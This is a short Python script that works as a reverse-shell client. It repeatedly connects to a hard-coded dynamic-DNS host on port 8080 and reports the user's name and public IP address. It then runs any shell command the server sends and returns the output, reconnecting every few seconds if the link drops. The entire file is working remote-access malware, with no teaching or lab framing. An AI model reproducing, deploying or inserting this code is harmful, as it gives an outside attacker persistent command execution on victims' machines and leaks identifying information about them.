import os
import socket
import subprocess
import json
import time
import getpass
import requests

SERVER = "posydon.ddns.net"
PORT = 8080
  
while True: # Infinite loop to keep trying to connect
   try:
       s = socket.socket()
       s.connect((SERVER, PORT))
       s.send(json.dumps({"type": "establishment", "data": {"username": getpass.getuser(), "hostname": requests.get('https://api.ipify.org').text}}).encode());
       print('established')
       try:
           while True:
                command = s.recv(1024).decode()
                print(command)
                if not command:
                  break
                print(command)
                if command.startswith('cd'):
                  os.chdir(command.split()[1])
                  result = "Successfully switched to directory: " + os.getcwd()
                else:
                  result = subprocess.getoutput(command)
                  print(result)
                 
                data_to_send = {'type': 'response', 'data': result}
                print(json.dumps(data_to_send).encode())
                # Encode the dictionary as a JSON string before sending
                s.send(json.dumps(data_to_send).encode())
       except KeyboardInterrupt:
           s.send("Connection closed by the user".encode())
       finally:
           s.close()
   except Exception as e: # Catch any exceptions that occur during connection
       print(f"An error occurred: {e}")
       time.sleep(5) # Wait for 5 seconds before trying to connect again